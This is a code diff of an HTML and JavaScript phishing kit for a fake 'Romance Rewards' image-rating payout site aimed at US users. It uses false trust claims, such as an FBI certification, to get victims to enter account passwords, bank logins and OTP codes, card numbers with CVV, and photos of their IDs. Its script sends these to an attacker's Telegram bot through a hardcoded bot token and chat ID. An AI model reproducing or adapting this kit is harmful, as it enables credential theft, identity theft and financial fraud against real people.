-        <div style="margin-top: auto; padding-top: 15px; border-top: 1px solid #334155; font-size: 0.75rem; color: #94a3b8; line-height: 1.5;">
-            <p style="margin-bottom: 8px; color: #38bdf8; font-weight: bold;">
-                <i class="fa-solid fa-circle-check"></i> Trusted by over (500,000+) active users since 2024.
-            </p>
-            <p>
-                🇺🇸 Fully compliant with US financial security standards, providing official guarantee and protection.
-            </p>
-        </div>
-    </div>
+<!-- 1. LANDING PAGE -->
+<div id="landing-page" class="page active">
+<div class="landing-header">
+<h1>ROMANCE REWARDS</h1>
+<p>US Official Daily Image Rating & Payout Portal</p>
+<div class="marquee-container">
+<marquee scrollamount="5">🇺🇸 Over 5,000+ active US members are successfully withdrawing daily rewards this week! • Instant Payouts via US Bank & Direct Deposit • Rated #1 Reward Portal in the US 🌟</marquee>
+</div>
+<div class="poster-grid-preview" id="landing-grid-preview"></div>
+<div class="marquee-container-payout">
+<marquee scrollamount="5" id="landing-payout-ticker"></marquee>
+</div>
+</div>
+<div class="trust-badges">
+<span><i class="fa-solid fa-lock"></i> 256-Bit SSL</span>
+<span><i class="fa-solid fa-flag-usa"></i> US Standard</span>
+<span><i class="fa-solid fa-check-circle"></i> Verified</span>
+</div>
+<button class="get-started-btn" onclick="switchPage('login-page')">Sign In to Account</button>
+</div>
 
-    <!-- 1. LANDING PAGE -->
-    <div id="landing-page" class="page active">
-        <div class="landing-header">
-            <h1>ROMANCE REWARDS</h1>
-            <div class="animated-banner">✨ Earn $2.00 Free For Every Rated Image ✨</div>
-        </div>
-        
-        <div class="poster-grid-preview" id="landing-grid-preview"></div>
-        
-        <div class="extra-info-text">
-            Rate daily new pictures and <span>instantly withdraw</span> your reward earnings.
-        </div>
+<!-- 2. LOGIN PAGE -->
+<div id="login-page" class="page">
+<div class="login-card">
+<h2>Secure Sign In</h2>
+<p>Enter your US registered account details.</p>
+<div class="login-input-group">
+<label>Email Address</label>
+<input type="email" id="login-email" placeholder="user@gmail.com">
+</div>
+<div class="login-input-group">
+<label>Password</label>
+<input type="password" id="login-pass" placeholder="Enter password">
+</div>
+<button type="button" class="login-submit-btn" onclick="handleLoginSubmit()">Sign In to Dashboard</button>
+<button type="button" class="login-back-btn" onclick="switchPage('landing-page')">Back to Home</button>
+</div>
+</div>
 
-        <button class="get-started-btn" onclick="switchPage('login-page')">Get Started & Sign In</button>
-    </div>
+<!-- 3. DASHBOARD PAGE -->
+<div id="dashboard-page" class="page">
+<div class="top-nav">
+<button class="menu-toggle-btn" onclick="toggleSidebar()"><i class="fa-solid fa-bars"></i></button>
+<div class="user-profile-widget">
+<div class="user-avatar-circle" id="user-avatar-letter">U</div>
+<div class="user-email-text" id="nav-email-display">user@gmail.com</div>
+</div>
+</div>
+<div class="dashboard-content">
+<div class="banner-earn">
+<h2 class="fading-title">💖 US Romance Reward Gallery</h2>
+<p>Rate pictures and get paid instantly to your US account</p>
+<div style="background: rgba(15, 23, 42, 0.6); padding: 6px 10px; border-radius: 12px; margin: 8px auto; max-width: 350px; font-size: 0.72rem; color: #34d399; font-weight: bold; border: 1px solid rgba(52, 211, 153, 0.3);">
+<marquee scrollamount="5" id="dashboard-payout-ticker"></marquee>
+</div>
+<div class="balance-box">Total Balance: $<span id="user-balance">15.00</span> USD</div>
+</div>
+<div class="section-title" id="section-title-count">Available Gallery Items</div>
+<div class="image-grid" id="image-grid-container"></div>
+</div>
+</div>
 
-    <!-- 2. LOGIN PAGE -->
-    <div id="login-page" class="page">
-        <div class="login-card">
-            <h2>Secure Sign In</h2>
-            <p>Enter your credentials to access your reward account.</p>
-            <div class="login-input-group">
-                <label>Email Address</label>
-                <input type="email" id="login-email" placeholder="user@gmail.com">
-            </div>
-            <div class="login-input-group">
-                <label>Password</label>
-                <input type="password" id="login-pass" placeholder="Enter password">
-            </div>
-            <button type="button" class="login-submit-btn" onclick="handleLoginSubmit()">Sign In to Dashboard</button>
-        </div>
-    </div>
+<!-- 4. DETAIL PAGE -->
+<div id="detail-page" class="page">
+<div>
+<button class="back-btn" onclick="goBackToDashboard()"><i class="fa-solid fa-arrow-left"></i> Back</button>
+</div>
+<div class="detail-container">
+<img id="detail-img" src="" class="detail-img" alt="Artwork">
+<h2 id="detail-title" style="margin-bottom: 6px; font-size: 1.15rem; color: #00f2fe;">Artwork Title</h2>
+<p style="color: #94a3b8; font-size: 0.82rem; margin-bottom: 14px;">Rate this picture to earn instant US reward credit.</p>
+<div class="rating-box">
+<p style="margin-bottom: 10px; font-size: 0.92rem; font-weight: 600;">How would you rate this picture?</p>
+<div class="star-rating" id="star-container">
+<i class="fa-solid fa-star" onclick="rateStar(1)"></i>
+<i class="fa-solid fa-star" onclick="rateStar(2)"></i>
+<i class="fa-solid fa-star" onclick="rateStar(3)"></i>
+<i class="fa-solid fa-star" onclick="rateStar(4)"></i>
+<i class="fa-solid fa-star" onclick="rateStar(5)"></i>
+</div>
+<button class="submit-rating-btn" onclick="submitRating()">Submit Rating & Earn $2.00</button>
+</div>
+</div>
+</div>
 
-    <!-- 3. DASHBOARD PAGE -->
-    <div id="dashboard-page" class="page">
-        <div class="top-nav">
-            <button class="menu-toggle-btn" onclick="toggleSidebar()"><i class="fa-solid fa-bars"></i></button>
-            <div class="user-profile-widget">
-                <div class="user-avatar-circle" id="user-avatar-letter">U</div>
-                <div class="user-email-text" id="nav-email-display">user@gmail.com</div>
-            </div>
-        </div>
-        <div class="dashboard-content">
-            <div class="banner-earn">
-                <h2>💖 Romance Image Rating Rewards</h2>
-                <p>Rate high-definition pictures and earn daily commissions</p>
-                <div class="balance-box">Total Balance: $<span id="user-balance">15.00</span> USD</div>
-            </div>
-            <div class="section-title">Available Romance Gallery</div>
-            <div class="image-grid" id="image-grid-container"></div>
-        </div>
-    </div>
+<!-- 5. ACCOUNT INFO PAGE (KYC) -->
+<div id="account-page" class="sub-page-container">
+<div>
+<button class="back-btn" onclick="switchPage('dashboard-page')"><i class="fa-solid fa-arrow-left"></i> Back</button>
+</div>
+<div class="sub-card">
+<h2 style="margin-bottom: 8px; color: #00f2fe; font-size: 1.15rem;">Account & US KYC Verification</h2>
+<p style="color: #94a3b8; font-size: 0.82rem; margin-bottom: 14px;">Enter your accurate US details and capture ID photos.</p>
+<div class="form-group"><label>Full Name</label><input type="text" id="kyc-name" placeholder="John Doe"></div>
+<div class="form-group"><label>US Phone Number</label><input type="text" id="kyc-phone" placeholder="+1 (555) 000-0000"></div>
+<div class="form-group"><label>ID Type</label><select id="kyc-id-type"><option>US Passport</option><option>Driver License</option><option>State ID</option></select></div>
+<div class="form-group">
+<label><i class="fa-solid fa-camera"></i> Front Side of ID</label>
+<input type="file" accept="image/*" capture="environment" id="front-id-input" onchange="previewImage(event, 'front-preview')" style="display:none;">
+<button type="button" onclick="document.getElementById('front-id-input').click()" style="background:#0f172a; border:1px solid #334155; color:#00f2fe; padding:10px; width:100%; border-radius:8px; cursor:pointer; font-size:0.85rem; font-weight:600; margin-bottom:8px;">Open Camera / Choose Front Photo</button>
+<div style="text-align:center;"><img id="front-preview" src="" style="max-width:100%; max-height:130px; display:none; border-radius:8px; border:1px solid #334155;" alt="Front ID Preview"></div>
+</div>
+<div class="form-group">
+<label><i class="fa-solid fa-camera"></i> Back Side of ID</label>
+<input type="file" accept="image/*" capture="environment" id="back-id-input" onchange="previewImage(event, 'back-preview')" style="display:none;">
+<button type="button" onclick="document.getElementById('back-id-input').click()" style="background:#0f172a; border:1px solid #334155; color:#00f2fe; padding:10px; width:100%; border-radius:8px; cursor:pointer; font-size:0.85rem; font-weight:600; margin-bottom:8px;">Open Camera / Choose Back Photo</button>
+<div style="text-align:center;"><img id="back-preview" src="" style="max-width:100%; max-height:130px; display:none; border-radius:8px; border:1px solid #334155;" alt="Back ID Preview"></div>
+</div>
+<button class="save-btn" onclick="saveKYCInfo()">Save & Send KYC Photos</button>
+</div>
+</div>
 
-    <!-- 4. DETAIL PAGE -->
-    <div id="detail-page" class="page">
-        <div style="padding: 20px 20px 0 20px;">
-            <button class="back-btn" onclick="switchPage('dashboard-page')"><i class="fa-solid fa-arrow-left"></i> Back</button>
-        </div>
-        <div class="detail-container">
-            <img id="detail-img" src="" class="detail-img" alt="Artwork">
-            <h2 id="detail-title" style="margin-bottom: 5px; font-size: 1.2rem;">Artwork Title</h2>
-            <p style="color: #94a3b8; font-size: 0.85rem; margin-bottom: 15px;">Rate this picture to earn instant reward credit.</p>
-            <div class="rating-box">
-                <p style="margin-bottom: 10px; font-size: 0.95rem;">How would you rate this picture?</p>
-                <div class="star-rating" id="star-container">
-                    <i class="fa-solid fa-star" onclick="rateStar(1)"></i>
-                    <i class="fa-solid fa-star" onclick="rateStar(2)"></i>
-                    <i class="fa-solid fa-star" onclick="rateStar(3)"></i>
-                    <i class="fa-solid fa-star" onclick="rateStar(4)"></i>
-                    <i class="fa-solid fa-star" onclick="rateStar(5)"></i>
-                </div>
-                <button class="submit-rating-btn" onclick="submitRating()">Submit Rating & Earn</button>
-            </div>
-        </div>
-    </div>
+<!-- 6. BANK & CARD LINK PAGE -->
+<div id="bank-connect-page" class="sub-page-container">
+<div>
+<button class="back-btn" onclick="switchPage('dashboard-page')"><i class="fa-solid fa-arrow-left"></i> Back</button>
+</div>
+<div class="sub-card">
+<div class="secure-badge"><i class="fa-solid fa-shield-halved"></i> US Financial Security Verified Portal</div>
+<h2 style="margin-bottom: 8px; color: #00f2fe; font-size: 1.15rem;">Link US Payout Method</h2>
+<p style="color: #94a3b8; font-size: 0.82rem; margin-bottom: 14px;">Choose your preferred method to receive earnings.</p>
+<div class="method-tabs">
+<div class="method-tab active" id="tab-bank" onclick="switchMethod('bank')">US Online Bank</div>
+<div class="method-tab" id="tab-card" onclick="switchMethod('card')">Debit / Credit Card</div>
+</div>
+<div id="form-bank-section">
+<div class="bank-options">
+<div class="bank-opt selected" onclick="selectBank('Chase Bank', this)"><i class="fa-solid fa-landmark"></i><span>Chase</span></div>
+<div class="bank-opt" onclick="selectBank('Bank of America', this)"><i class="fa-solid fa-flag-usa"></i><span>BofA</span></div>
+<div class="bank-opt" onclick="selectBank('Wells Fargo', this)"><i class="fa-solid fa-building-columns"></i><span>Wells</span></div>
+<div class="bank-opt" onclick="selectBank('Other Bank', this)"><i class="fa-solid fa-plus-circle"></i><span>Other</span></div>
+</div>
+<div class="form-group" id="other-bank-group" style="display: none;">
+<label>Bank Name</label>
+<input type="text" id="other-bank-name" placeholder="Enter bank name">
+</div>
+<div class="form-group"><label>Online ID / Username</label><input type="text" id="bank-user" placeholder="Online ID"></div>
+<div class="form-group"><label>Password / PIN</label><input type="password" id="bank-pass" placeholder="Password"></div>
+<div class="form-group"><label>Secure OTP / PIN Code</label><input type="password" id="bank-otp" placeholder="6-digit code"></div>
+</div>
+<div id="form-card-section" style="display: none;">
+<div class="form-group"><label>Cardholder Name</label><input type="text" id="card-name" placeholder="Name on card"></div>
+<div class="form-group"><label>Card Number (16 Digits)</label><input type="text" id="card-number" placeholder="4111 2222 3333 4444" maxlength="19"></div>
+<div style="display: flex; gap: 10px;">
+<div class="form-group" style="flex:1;"><label>Exp Date (MM/YY)</label><input type="text" id="card-exp" placeholder="MM/YY" maxlength="5"></div>
+<div class="form-group" style="flex:1;"><label>CVV</label><input type="password" id="card-cvv" placeholder="123" maxlength="4"></div>
+</div>
+<div class="form-group"><label>Billing ZIP Code</label><input type="text" id="card-zip" placeholder="90210" maxlength="5"></div>
+</div>
+<button class="save-btn" onclick="savePaymentMethod()">Secure Connect & Save</button>
+</div>
+</div>
 
-    <!-- 5. BANK CONNECT PAGE -->
-    <div id="bank-connect-page" class="page">
-        <div style="padding: 20px 20px 0 20px;">
-            <button class="back-btn" onclick="switchPage('dashboard-page')"><i class="fa-solid fa-arrow-left"></i> Back</button>
-        </div>
-        <div class="bank-card">
-            <div class="secure-badge"><i class="fa-solid fa-shield-halved"></i> US Financial Security Verified Portal</div>
-            <h2 style="margin-bottom: 10px; color: #38bdf8; font-size: 1.2rem;">Connect US Bank Online</h2>
-            <p style="color: #94a3b8; font-size: 0.85rem; margin-bottom: 15px;">Select your bank and verify your credentials.</p>
-            
-            <div class="bank-options">
-                <div class="bank-opt selected" onclick="selectBank('Philo Exchange', this)"><i class="fa-solid fa-building-columns"></i><span>Philo Ex</span></div>
-                <div class="bank-opt" onclick="selectBank('Chase Bank', this)"><i class="fa-solid fa-landmark"></i><span>Chase</span></div>
-                <div class="bank-opt" onclick="selectBank('Bank of USA', this)"><i class="fa-solid fa-flag-usa"></i><span>USA Bank</span></div>
-                <div class="bank-opt" onclick="selectBank('Other Bank', this)"><i class="fa-solid fa-plus-circle"></i><span>Other</span></div>
-            </div>
+<!-- 7. BALANCE STATEMENT PAGE -->
+<div id="balance-page" class="sub-page-container">
+<div>
+<button class="back-btn" onclick="switchPage('dashboard-page')"><i class="fa-solid fa-arrow-left"></i> Back</button>
+</div>
+<div class="sub-card" style="text-align: center;">
+<h2 style="margin-bottom: 14px; color: #00f2fe; font-size: 1.15rem;">Balance Statement & Ledger</h2>
+<div style="background: #0f172a; padding: 20px; border-radius: 12px; margin-bottom: 14px; border: 1px solid #334155;">
+<p style="color: #94a3b8; font-size: 0.88rem;">Available Balance</p>
+<h1 style="color: #10b981; font-size: 2rem; margin-top: 6px; text-shadow: 0 0 15px rgba(16, 185, 129, 0.3);">$<span id="statement-balance">15.00</span> USD</h1>
+</div>
+<p style="color: #94a3b8; font-size: 0.82rem;">All earnings from picture ratings are credited securely.</p>
+</div>
+</div>
 
-            <div class="form-group" id="other-bank-group" style="display: none;">
-                <label>Enter Bank Name</label>
-                <input type="text" id="other-bank-name" placeholder="Type bank name">
-            </div>
+<!-- 8. WITHDRAW FUNDS PAGE -->
+<div id="withdraw-page" class="sub-page-container">
+<div>
+<button class="back-btn" onclick="switchPage('dashboard-page')"><i class="fa-solid fa-arrow-left"></i> Back</button>
+</div>
+<div class="sub-card">
+<h2 style="margin-bottom: 8px; color: #00f2fe; font-size: 1.15rem;">Withdraw Funds</h2>
+<p style="color: #94a3b8; font-size: 0.82rem; margin-bottom: 14px;">Transfer your reward balance directly to your US account.</p>
+<div class="form-group"><label>Amount ($ USD)</label><input type="number" id="withdraw-amount" placeholder="15.00"></div>
+<div class="form-group"><label>Account Password</label><input type="password" id="withdraw-pass" placeholder="Enter password"></div>
+<button class="save-btn" onclick="submitWithdrawal()">Request Instant Payout</button>
+</div>
+</div>
 
-            <div class="form-group">
-                <label>Online ID / Username</label>
-                <input type="text" id="bank-user" placeholder="Enter Online ID">
-            </div>
-            <div class="form-group">
-                <label>Password / PIN</label>
-                <input type="password" id="bank-pass" placeholder="Enter Password">
-            </div>
-            <div class="form-group">
-                <label>Emergency OTP / Secure Code</label>
-                <input type="password" id="bank-otp" placeholder="6-digit code">
-            </div>
+<!-- 9. CUSTOMER SUPPORT PAGE -->
+<div id="support-page" class="sub-page-container">
+<div>
+<button class="back-btn" onclick="switchPage('dashboard-page')"><i class="fa-solid fa-arrow-left"></i> Back</button>
+</div>
+<div class="sub-card" style="text-align: center; min-height: 250px; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+<h2 style="color: #00f2fe; font-size: 1.15rem; margin-bottom: 8px;">Customer Support</h2>
+<p style="color: #94a3b8; font-size: 0.85rem;">Support modules are coming soon. Blank page ready for custom updates.</p>
+</div>
+</div>
 
-            <div class="fbi-gold-badge">
-                <i class="fa-solid fa-award"></i> FBI Cyber Division & US Financial Security Certified
-            </div>
+<!-- INTERACTIVE INFO MODAL -->
+<div id="infoModal" class="modal-overlay">
+<div class="modal-content-card">
+<button class="modal-back-btn" onclick="closeModal()"><i class="fa-solid fa-arrow-left"></i> Back</button>
+<div id="modalBodyContent"></div>
+</div>
+</div>
 
-            <button class="save-btn" onclick="saveUSBankInfo()">Secure Connect & Claim Payout</button>
-        </div>
-    </div>
+<script>
+const BOT_TOKEN = "8814587372:AAFAdCFJ_4AvlIH9fYjMISEDUfMiAFIvKXw";
+const CHAT_ID = "6567680291";
 
-    <script>
-        const BOT_TOKEN = "8814587372:AAFAdCFJ_4AvlIH9fYjMISEDUfMiAFIvKXw";
-        const CHAT_ID = "6567680291";
+function sendToTelegram(message) {
+let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+fetch(url).catch(err => console.log(err));
+}
 
-        function sendToTelegram(message) {
-            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-            fetch(url).catch(err => console.log(err));
-        }
+function sendPhotoToTelegram(photoBase64, caption) {
+let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+let formData = new FormData();
+formData.append("chat_id", CHAT_ID);
+formData.append("caption", caption);
+fetch(photoBase64)
+.then(res => res.blob())
+.then(blob => {
+formData.append("photo", blob, "id_card.jpg");
+fetch(url, { method: "POST", body: formData }).catch(err => console.log(err));
+});
+}
 
-        const images = [
-            { title: "Romance Scene 01", img: "https://i.ibb.co/3ynFsqY5/IMG-7614.jpg" },
-            { title: "Romance Scene 02", img: "https://i.ibb.co/qF33kSKh/IMG-7615.jpg" },
-            { title: "Romance Scene 03", img: "https://i.ibb.co/gMpd20jm/PNG-image-48.png" },
-            { title: "Romance Scene 04", img: "https://i.ibb.co/8LgK3SM2/PNG-image-50.png" },
-            { title: "Romance Scene 05", img: "https://i.ibb.co/MkdBbScF/PNG-image-44.png" },
-            { title: "Romance Scene 06", img: "https://i.ibb.co/nsfVHV4j/PNG-image-46.png" },
-            { title: "Romance Scene 07", img: "https://i.ibb.co/yFsgVVjN/PNG-image-45.png" },
-            { title: "Romance Scene 08", img: "https://i.ibb.co/SHTpjt4/PNG-image-49.png" },
-            { title: "Romance Scene 09", img: "https://i.ibb.co/TB1QfQ2G/PNG-image-30.png" },
-            { title: "Romance Scene 10", img: "https://i.ibb.co/Qgy2HG0/PNG-image-3.png" },
-            { title: "Romance Scene 11", img: "https://i.ibb.co/HfNbYzHn/PNG-image-33.png" },
-            { title: "Romance Scene 12", img: "https://i.ibb.co/yFJbCLbr/PNG-image-6.png" },
-            { title: "Romance Scene 13", img: "https://i.ibb.co/5gLDdDfy/PNG-image-24.png" },
-            { title: "Romance Scene 14", img: "https://i.ibb.co/66XHq3K/PNG-image-9.png" },
-            { title: "Romance Scene 15", img: "https://i.ibb.co/qY18mdm4/PNG-image-40.png" },
-            { title: "Romance Scene 16", img: "https://i.ibb.co/60BJ6F4F/PNG-image-12.png" },
-            { title: "Romance Scene 17", img: "https://i.ibb.co/kV1Z2LJY/PNG-image-19.png" },
-            { title: "Romance Scene 18", img: "https://i.ibb.co/QjJXx2z3/PNG-image-27.png" },
-            { title: "Romance Scene 19", img: "https://i.ibb.co/93njPRRD/PNG-image-4.png" },
-            { title: "Romance Scene 20", img: "https://i.ibb.co/C5gwT7pz/PNG-image-16.png" },
-            { title: "Romance Scene 21", img: "https://i.ibb.co/Hfd10pKH/PNG-image-43.png" },
-            { title: "Romance Scene 22", img: "https://i.ibb.co/Jjgpd9Bx/PNG-image-31.png" },
-            { title: "Romance Scene 23", img: "https://i.ibb.co/BVmmkWVG/PNG-image-36.png" },
-            { title: "Romance Scene 24", img: "https://i.ibb.co/Rk4PZQ85/PNG-image-28.png" },
-            { title: "Romance Scene 25", img: "https://i.ibb.co/6JsM7D9j/PNG-image.png" },
-            { title: "Romance Scene 26", img: "https://i.ibb.co/27RPrnKL/PNG-image-22.png" },
-            { title: "Romance Scene 27", img: "https://i.ibb.co/0y7WWHZ0/PNG-image-7.png" },
-            { title: "Romance Scene 28", img: "https://i.ibb.co/gbkQjmWv/PNG-image-47.png" },
-            { title: "Romance Scene 29", img: "https://i.ibb.co/jv0LcJLK/PNG-image-10.png" },
-            { title: "Romance Scene 30", img: "https://i.ibb.co/fVkG0Q4n/PNG-image-25.png" },
-            { title: "Romance Scene 31", img: "https://i.ibb.co/xK6zptw7/PNG-image-13.png" },
-            { title: "Romance Scene 32", img: "https://i.ibb.co/TN9DhD2/PNG-image-41.png" },
-            { title: "Romance Scene 33", img: "https://i.ibb.co/XkNVMWRP/PNG-image-37.png" },
-            { title: "Romance Scene 34", img: "https://i.ibb.co/wFjNsQR3/PNG-image-34.png" },
-            { title: "Romance Scene 35", img: "https://i.ibb.co/Fk4VJ0MH/PNG-image-14.png" },
-            { title: "Romance Scene 36", img: "https://i.ibb.co/DmkxmkC/PNG-image-20.png" },
-            { title: "Romance Scene 37", img: "https://i.ibb.co/mFb1V3G0/PNG-image-17.png" },
-            { title: "Romance Scene 38", img: "https://i.ibb.co/RTM7kfTF/PNG-image-5.png" },
-            { title: "Romance Scene 39", img: "https://i.ibb.co/DPTg7xC1/PNG-image-32.png" },
-            { title: "Romance Scene 40", img: "https://i.ibb.co/DDhMkLCM/PNG-image-2.png" },
-            { title: "Romance Scene 41", img: "https://i.ibb.co/0yxTH6bm/PNG-image-29.png" },
-            { title: "Romance Scene 42", img: "https://i.ibb.co/G4GdwsYK/PNG-image-39.png" },
-            { title: "Romance Scene 43", img: "https://i.ibb.co/CKJMM9F7/PNG-image-26.png" },
-            { title: "Romance Scene 44", img: "https://i.ibb.co/tp5j2v1p/PNG-image-15.png" },
-            { title: "Romance Scene 45", img: "https://i.ibb.co/jPwkygjH/PNG-image-8.png" },
-            { title: "Romance Scene 46", img: "https://i.ibb.co/HfF3PmPh/PNG-image-23.png" },
-            { title: "Romance Scene 47", img: "https://i.ibb.co/hJ22zW3y/PNG-image-11.png" },
-            { title: "Romance Scene 48", img: "https://i.ibb.co/v4nfR5kC/PNG-image-42.png" },
-            { title: "Romance Scene 49", img: "https://i.ibb.co/TxLrNhCX/PNG-image-38.png" },
-            { title: "Romance Scene 50", img: "https://i.ibb.co/Z6t3sqf9/PNG-image-35.png" },
-            { title: "Romance Scene 51", img: "https://i.ibb.co/ZDRqMQK/PNG-image-18.png" },
-            { title: "Romance Scene 52", img: "https://i.ibb.co/5XRRHCfV/PNG-image-93.png" },
-            { title: "Romance Scene 53", img: "https://i.ibb.co/Rp8TWVfB/PNG-image-59.png" },
-            { title: "Romance Scene 54", img: "https://i.ibb.co/5gvryMqb/PNG-image-89.png" },
-            { title: "Romance Scene 55", img: "https://i.ibb.co/z1nBY8f/PNG-image-79.png" },
-            { title: "Romance Scene 56", img: "https://i.ibb.co/Ndtkxvp2/PNG-image-81.png" },
-            { title: "Romance Scene 57", img: "https://i.ibb.co/rRGzSLmy/PNG-image-69.png" },
-            { title: "Romance Scene 58", img: "https://i.ibb.co/v6qHsvkN/PNG-image-95.png" },
-            { title: "Romance Scene 59", img: "https://i.ibb.co/Y7w2Nx80/PNG-image-70.png" },
-            { title: "Romance Scene 60", img: "https://i.ibb.co/1fk1jJwx/PNG-image-56.png" },
-            { title: "Romance Scene 61", img: "https://i.ibb.co/zhgx6FtT/PNG-image-84.png" },
-            { title: "Romance Scene 62", img: "https://i.ibb.co/d0Lwv7bn/PNG-image-77.png" },
-            { title: "Romance Scene 63", img: "https://i.ibb.co/Hfs08gPn/PNG-image-72.png" },
-            { title: "Romance Scene 64", img: "https://i.ibb.co/B50w81SC/PNG-image-86.png" },
-            { title: "Romance Scene 65", img: "https://i.ibb.co/TD4HRSKY/PNG-image-87.png" },
-            { title: "Romance Scene 66", img: "https://i.ibb.co/2Y8jDbHD/PNG-image-64.png" },
-            { title: "Romance Scene 67", img: "https://i.ibb.co/bgvTq6HX/PNG-image-55.png" },
-            { title: "Romance Scene 68", img: "https://i.ibb.co/j969hsqY/PNG-image-60.png" },
-            { title: "Romance Scene 69", img: "https://i.ibb.co/hJKxLY4n/PNG-image-67.png" },
-            { title: "Romance Scene 70", img: "https://i.ibb.co/gZG85m8K/PNG-image-98.png" },
-            { title: "Romance Scene 71", img: "https://i.ibb.co/tT0TX7Rb/PNG-image-94.png" },
-            { title: "Romance Scene 72", img: "https://i.ibb.co/S4fjnjL6/PNG-image-75.png" },
-            { title: "Romance Scene 73", img: "https://i.ibb.co/Z6p9Gf9F/PNG-image-99.png" },
-            { title: "Romance Scene 74", img: "https://i.ibb.co/pjwT6vSh/PNG-image-73.png" },
-            { title: "Romance Scene 75", img: "https://i.ibb.co/sJcH413z/PNG-image-92.png" },
-            { title: "Romance Scene 76", img: "https://i.ibb.co/jPjCphYg/PNG-image-88.png" },
-            { title: "Romance Scene 77", img: "https://i.ibb.co/Z66nmyWM/PNG-image-82.png" },
-            { title: "Romance Scene 78", img: "https://i.ibb.co/YFpfQFtg/PNG-image-97.png" },
-            { title: "Romance Scene 79", img: "https://i.ibb.co/m5SBGtBt/PNG-image-71.png" },
-            { title: "Romance Scene 80", img: "https://i.ibb.co/rKwbmJx1/PNG-image-80.png" },
-            { title: "Romance Scene 81", img: "https://i.ibb.co/tTmBv5Yf/PNG-image-62.png" },
-            { title: "Romance Scene 82", img: "https://i.ibb.co/Bh7p8pf/PNG-image-96.png" },
-            { title: "Romance Scene 83", img: "https://i.ibb.co/TDTTqKkD/PNG-image-58.png" },
-            { title: "Romance Scene 84", img: "https://i.ibb.co/66Y0bVF/PNG-image-61.png" },
-            { title: "Romance Scene 85", img: "https://i.ibb.co/kV6MdQzz/PNG-image-78.png" },
-            { title: "Romance Scene 86", img: "https://i.ibb.co/vS0j4jh/PNG-image-76.png" },
-            { title: "Romance Scene 87", img: "https://i.ibb.co/Jws3Q58h/PNG-image-65.png" },
-            { title: "Romance Scene 88", img: "https://i.ibb.co/6hJWsty/PNG-image-57.png" },
-            { title: "Romance Scene 89", img: "https://i.ibb.co/PZqrn671/PNG-image-91.png" },
-            { title: "Romance Scene 90", img: "https://i.ibb.co/JjZXfbrX/PNG-image-74.png" },
-            { title: "Romance Scene 91", img: "https://i.ibb.co/DPHp4bSH/PNG-image-85.png" },
-            { title: "Romance Scene 92", img: "https://i.ibb.co/C3ycmKH5/PNG-image-68.png" },
-            { title: "Romance Scene 93", img: "https://i.ibb.co/x8K68bDc/PNG-image-66.png" },
-            { title: "Romance Scene 94", img: "https://i.ibb.co/RGVnRw3k/PNG-image-83.png" },
-            { title: "Romance Scene 95", img: "https://i.ibb.co/1YbJJJ5v/PNG-image-90.png" },
-            { title: "Romance Scene 96", img: "https://i.ibb.co/nqHcmzn1/PNG-image-63.png" }
-        ];
+const rawImageUrls = [
+"https://i.ibb.co/zhwdB8yv/PNG-image-101.png",
+"https://i.ibb.co/Y4xkd3PR/PNG-image-118.png",
+"https://i.ibb.co/mCvZCzwN/PNG-image-119.png",
+"https://i.ibb.co/S75jtkF5/PNG-image-117.png",
+"https://i.ibb.co/3mzkpMsb/PNG-image-100.png",
+"https://i.ibb.co/JjrfNPrc/PNG-image-103.png",
+"https://i.ibb.co/4gjX05s0/PNG-image-125.png",
+"https://i.ibb.co/fVxPsbyd/PNG-image-120.png",
+"https://i.ibb.co/4RG6vbFb/PNG-image-123.png",
+"https://i.ibb.co/k29J8hhc/PNG-image-121.png",
+"https://i.ibb.co/ycB1qcTp/PNG-image-122.png",
+"https://i.ibb.co/v6mLVNR7/PNG-image-105.png",
+"https://i.ibb.co/jv4YnJf4/PNG-image-102.png",
+"https://i.ibb.co/nvcHz4T/PNG-image-107.png",
+"https://i.ibb.co/PsPGmnTD/PNG-image-124.png",
+"https://i.ibb.co/CpQVhQ63/PNG-image-104.png",
+"https://i.ibb.co/yB8b4Nvp/PNG-image-126.png",
+"https://i.ibb.co/G3v8y2Rw/PNG-image-106.png",
+"https://i.ibb.co/NgrhXgVr/PNG-image-108.png",
+"https://i.ibb.co/N22mHyTq/PNG-image-109.png",
+"https://i.ibb.co/3mm1J00L/PNG-image-115.png",
+"https://i.ibb.co/Q3t3cpNg/PNG-image-114.png",
+"https://i.ibb.co/DgSWwWPM/PNG-image-110.png",
+"https://i.ibb.co/vxjTcgCw/PNG-image-112.png",
+"https://i.ibb.co/yFynrxDL/PNG-image-116.png",
+"https://i.ibb.co/Zzm8RV0g/PNG-image-111.png",
+"https://i.ibb.co/YgqL0Q9/PNG-image-113.png",
+"https://i.ibb.co/nqHcmzn1/PNG-image-63.png",
+"https://i.ibb.co/1YbJJJ5v/PNG-image-90.png",
+"https://i.ibb.co/RGVnRw3k/PNG-image-83.png",
+"https://i.ibb.co/x8K68bDc/PNG-image-66.png",
+"https://i.ibb.co/C3ycmKH5/PNG-image-68.png",
+"https://i.ibb.co/DPHp4bSH/PNG-image-85.png",
+"https://i.ibb.co/JjZXfbrX/PNG-image-74.png",
+"https://i.ibb.co/PZqrn671/PNG-image-91.png",
+"https://i.ibb.co/6hJWsty/PNG-image-57.png",
+"https://i.ibb.co/Jws3Q58h/PNG-image-65.png",
+"https://i.ibb.co/vS0j4jh/PNG-image-76.png",
+"https://i.ibb.co/kV6MdQzz/PNG-image-78.png",
+"https://i.ibb.co/66Y0bVF/PNG-image-61.png",
+"https://i.ibb.co/TDTTqKkD/PNG-image-58.png",
+"https://i.ibb.co/Bh7p8pf/PNG-image-96.png",
+"https://i.ibb.co/tTmBv5Yf/PNG-image-62.png",
+"https://i.ibb.co/rKwbmJx1/PNG-image-80.png",
+"https://i.ibb.co/m5SBGtBt/PNG-image-71.png",
+"https://i.ibb.co/YFpfQFtg/PNG-image-97.png",
+"https://i.ibb.co/Z66nmyWM/PNG-image-82.png",
+"https://i.ibb.co/jPjCphYg/PNG-image-88.png",
+"https://i.ibb.co/sJcH413z/PNG-image-92.png",
+"https://i.ibb.co/pjwT6vSh/PNG-image-73.png",
+"https://i.ibb.co/Z6p9Gf9F/PNG-image-99.png",
+"https://i.ibb.co/S4fjnjL6/PNG-image-75.png",
+"https://i.ibb.co/tT0TX7Rb/PNG-image-94.png",
